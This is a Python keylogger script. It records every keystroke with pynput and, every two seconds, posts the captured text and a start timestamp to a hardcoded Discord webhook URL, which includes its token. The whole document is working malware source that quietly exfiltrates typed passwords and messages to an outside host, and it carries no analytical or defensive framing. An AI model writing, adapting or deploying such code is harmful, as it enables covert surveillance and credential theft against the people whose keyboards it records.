import pynput, requests, json
from threading import Timer
from datetime import datetime as d



WEBHOOK_URL = "https://discord.com/api/webhooks/1328866786388742145/W118Jsi5p2h-rztNtq46ctDoEAOu0mDV3yO6CLZZgODFGxkp4SN-Ops3q62VMaLH0CWf"

keystroke_buffer = []
time_buffer = []

def send_printed_status():
    print("Sent message buffer")

def send_to_discord():
    global keystroke_buffer
    if keystroke_buffer:
        message = "".join(keystroke_buffer)
        payload = {
            "content": f"```\n{message}\n```"
        }
        headers = {
            "Content-Type": "application/json"
        }
        requests.post(WEBHOOK_URL, data=json.dumps(payload), headers=headers)
        keystroke_buffer = []
    Timer(2, send_to_discord).start()
    Timer(2, send_printed_status).start()


def send_time():
    date = d.now()
    message = date.strftime("%Y-%m-%d %H:%M:%S")
    payload = {
        "content": f"```\n{message}\n```"
    }
    headers = {
        "Content-Type": "application/json"
    }
    requests.post(WEBHOOK_URL, data=json.dumps(payload), headers=headers)

def on_press(key):
    try:
        keystroke_buffer.append(key.char)
    except AttributeError:
        keystroke_buffer.append(f"[{key}]")

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False



send_time()

Timer(2, send_to_discord).start()

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()